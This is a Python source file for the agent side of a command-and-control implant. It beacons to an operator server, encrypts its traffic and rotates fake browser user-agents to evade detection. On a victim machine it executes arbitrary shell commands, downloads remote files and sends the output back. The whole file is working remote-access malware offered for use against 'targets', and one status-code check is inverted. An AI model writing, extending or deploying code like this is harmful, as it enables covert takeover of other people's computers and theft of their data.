## AGENT SİDE
import json
import time
import uuid
import random
import requests
import subprocess

from urllib3.util import url

from Encryption import encrypt_data

#Configuration
SERVER_URL = 'http://127.0.0.1:8000' # YOUR SERVER IP
BEACON_ENDPOINT = "/api/status"
RESULT_ENDPOINT = '/api/result'
SLEEP_MIN= 10
SLEEP_MAX= 30

#Generate a unique id for this target
AGENT_ID = str(uuid.uuid4())

#Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

def beacon():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session": str(uuid.uuid4())
    }

    payload = {"id": AGENT_ID}
    encrypted_payload = encrypt_data(json.dumps(payload))
    try:
        response = requests.post(SERVER_URL+BEACON_ENDPOINT, json={"data":encrypted_payload}, headers=headers)
        if response.status_code != 200:
            data = response.json()
            task = data.get('task')
            if task:
                execute_task(task)
    except Exception as e:
        print(f"[!] Beacon error : {e}")



def execute_task(task):
    task_type = task.get('type')

    if task_type == 'shell':
        command = task.get('command')
        run_shell(command)
    elif task_type == 'download':
        url = task.get('url')
        save_as = task.get('save_as')
        download_file(url, save_as)
    elif task_type == 'sleep':
        global SLEEP_MIN, SLEEP_MAX
        SLEEP_MIN = task.get("min", SLEEP_MIN)
        SLEEP_MAX = task.get("max", SLEEP_MAX)
    else:
        print(f"[!] Unknown task type : {task_type}")



def run_shell(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode()) # byte -> string
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def download_file(url, save_as):
    try:
        response = requests.get(url, stream=True)
        with open(save_as, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} as {save_as}")
    except Exception as e:
        post_result(f"[!] Download error : {e}")




def post_result(result):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session": str(uuid.uuid4())

    }
    payload = {"id": AGENT_ID, "output": result}
    encrypted_payload = encrypt_data(json.dumps(payload))
    try:
        response = requests.post(SERVER_URL+RESULT_ENDPOINT, json={"data":encrypted_payload}, headers=headers)
    except Exception as e:
        print(f"[!] Result posting error : {e}")

def main():
    while True:
        beacon()
        sleep_time = random.uniform(SLEEP_MIN, SLEEP_MAX)
        time.sleep(sleep_time)




if __name__ == '__main__':
    main()